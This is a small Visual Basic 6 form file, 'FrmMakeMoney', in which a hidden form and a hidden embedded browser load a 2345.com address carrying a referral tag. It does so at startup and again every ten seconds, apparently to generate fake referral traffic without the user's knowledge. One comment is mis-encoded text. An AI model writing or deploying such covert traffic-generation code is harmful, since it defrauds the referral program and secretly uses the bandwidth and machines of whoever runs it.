VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "ieframe.dll"
Begin VB.Form FrmMakeMoney 
   Caption         =   "Form1"
   ClientHeight    =   6315
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   9375
   LinkTopic       =   "Form1"
   ScaleHeight     =   6315
   ScaleWidth      =   9375
   StartUpPosition =   3  '´°¿ÚÈ±Ê¡
   Visible         =   0   'False
   Begin VB.Timer Timer1 
      Interval        =   9999
      Left            =   0
      Top             =   0
   End
   Begin SHDocVwCtl.WebBrowser wb 
      Height          =   5655
      Left            =   480
      TabIndex        =   0
      Top             =   360
      Visible         =   0   'False
      Width           =   8535
      ExtentX         =   15055
      ExtentY         =   9975
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   ""
   End
End
Attribute VB_Name = "FrmMakeMoney"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
wb.Navigate "http://www.2345.com/?kfirsoft"
End Sub

Private Sub Timer1_Timer()
wb.Navigate "http://www.2345.com/?kfirsoft"
'MsgBox "success to load."
End Sub
